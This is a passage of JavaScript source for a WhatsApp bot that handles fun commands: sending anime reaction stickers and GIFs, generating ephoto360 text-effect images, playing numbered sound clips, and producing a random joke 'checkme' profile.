VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
			case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await VeranBotInc.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
	if (m.isGroup) return VeranStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let veranresources = await Telesticker(args[0])
		await replygcveran(`Sending ${veranresources.length} stickers...`)
		if (m.isGroup && veranresources.length > 30) {
			await replygcveran('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < veranresources.length; i++) {
				VeranBotInc.sendMessage(m.sender, { sticker: { url: veranresources[i].url }})
			}
		} else {
			for (let i = 0; i < veranresources.length; i++) {
				VeranBotInc.sendMessage(m.chat, { sticker: { url: veranresources[i].url }})
			}
		}
	} else replygcveran(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
        
        
        
        
        
        
        // poto meker
        case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!text) return reply(`Example : ${prefix+command} +`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, text)
ptz.sendMessage(m.chat, { image: { url: haldwhd }, caption: `Done` }, { quoted: m })
}
break

			case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
VeranBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await VeranBotInc.sendMessage(m.chat, { audio: VeranBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
			case 'checkme':{
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${m.pushName}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await VeranBotInc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppveran = await getBuffer(ppuser)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: profile
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: ppveran, mentions: [bet]}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [bet], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'hug': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} hugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cry': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cried themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kill': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} killed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pat': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} patted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'lick': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} licked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kiss': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} kissed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bite': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bit themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'yeet': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} yeeted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bully': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bullied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bonk': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bonked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wink': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} winked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'poke': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} poked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'nom': {

        if (!m.isGroup) return VeranStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcveran(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} nommed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          VeranBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

